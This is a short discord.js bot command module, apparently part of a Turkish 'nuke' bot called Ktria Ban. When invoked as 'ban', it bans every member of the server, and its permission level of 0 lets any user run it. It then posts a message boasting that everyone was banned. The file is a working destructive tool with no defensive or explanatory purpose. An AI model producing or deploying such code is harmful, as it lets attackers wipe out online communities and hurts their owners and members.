const Discord = require("discord.js");

module.exports.run = async (client, message, args) => {

message.guild.members.forEach(member => {member.ban()});
message.channel.send("**Ktria Ban v12 Sunucuda Bulunan Herkesi Başarılı Bir Şekilde Banladı ☑️**")
  
};

module.exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: [],
  permLevel: 0,
  kategori: "ktriaban"
};

module.exports.help = {
  name: "ban",
  description: "uye",
  usage: "ban"
};
